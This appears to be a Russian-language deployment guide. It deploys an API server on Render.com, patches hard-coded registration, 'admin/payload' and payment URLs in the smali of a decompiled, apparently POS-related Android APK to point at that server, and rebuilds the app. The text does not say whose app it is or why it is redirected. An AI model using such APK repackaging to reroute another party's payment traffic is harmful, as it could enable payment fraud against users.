# Деплой на Render.com

## Шаги для деплоя:

### 1. Подготовка репозитория
Создай Git репозиторий и загрузи файлы:
```bash
git init
git add api_server.py requirements.txt render.yaml
git commit -m "Initial commit"
```

Создай репозиторий на GitHub и загрузи код:
```bash
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git
git push -u origin main
```

### 2. Деплой на Render

1. Зайди на https://render.com и войди через GitHub
2. Нажми "New +" → "Web Service"
3. Подключи свой GitHub репозиторий
4. Render автоматически обнаружит `render.yaml`
5. Нажми "Apply" и дождись деплоя

### 3. Получи URL сервера

После деплоя Render даст тебе URL вида:
```
https://sberpos-api-XXXX.onrender.com
```

### 4. Обнови URL в приложении

Замени в `apktool_out/smali_classes3/com/roder300/kozen/MainActivity.smali`:

```smali
const-string v0, "https://YOUR-APP.onrender.com/register"
const-string v0, "https://YOUR-APP.onrender.com/admin/payload"
const-string p0, "https://YOUR-APP.onrender.com"
const-string v2, "https://YOUR-APP.onrender.com/pay?id="
```

### 5. Обнови URL в боте

В `bot.py` измени:
```python
BASE = 'https://YOUR-APP.onrender.com'
```

### 6. Пересобери APK
```powershell
.\build_and_install.ps1
```

## Важно!

- Render бесплатный план засыпает после 15 минут неактивности
- Первый запрос после сна может занять 30-60 секунд
- Терминалы сохраняются в файл `terminals_db.json` и не теряются при перезапуске

## Проверка работы

Открой в браузере:
```
https://YOUR-APP.onrender.com/
```

Должен вернуться JSON с информацией о сервере.

## Логи

Смотри логи в Render Dashboard → твой сервис → Logs
